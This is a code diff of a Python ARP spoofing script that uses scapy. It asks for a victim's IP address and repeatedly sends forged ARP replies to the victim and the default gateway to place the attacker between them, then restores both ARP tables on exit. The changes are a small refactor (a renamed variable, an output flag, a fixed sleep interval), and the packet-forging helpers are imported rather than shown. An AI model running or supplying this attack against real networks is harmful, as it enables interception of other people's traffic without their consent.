@@ -3,7 +3,7 @@ from helper import *
 
 victim_ip = input("Enter victim's IP address: ")
 
-def spoofing(victim_ip, sleep):
+def spoofing(victim_ip, output = False):
     """
     Performs the ARP spoofing attack
     The function should be executed during the attack,
@@ -21,19 +21,20 @@ def spoofing(victim_ip, sleep):
     Step 5: Restoring gateway's ARP table
     """
 
+    sleep = 2
     packets_count = 0
-    victim_gateway = scapy.conf.route.route("0.0.0.0")[2]
+    gateway = scapy.conf.route.route("0.0.0.0")[2]
     
     try:
         while True:
             # Step 1
-            spoof(victim_ip, victim_gateway)
+            spoof(victim_ip, gateway, output)
 
             # Step 2
-            spoof(victim_gateway, victim_ip)
+            spoof(gateway, victim_ip, output)
 
             packets_count += 2
-            print(f"\rPackets sent: {packets_count}", end="")
+            print(f"[+] Packets sent: {packets_count}")
 
             # Step 3
             time.sleep(sleep)
@@ -41,11 +42,11 @@ def spoofing(victim_ip, sleep):
         print("\n Reseting ARP tables. Please wait...")
         
         # Step 4
-        restore(victim_ip, victim_gateway)
+        restore(victim_ip, gateway, output)
 
         # Step 5
-        restore(victim_gateway, victim_ip)
+        restore(gateway, victim_ip, output)
 
         print("\n ARP tables restored.")
         
-spoofing(victim_ip, 2)
+spoofing(victim_ip, True)
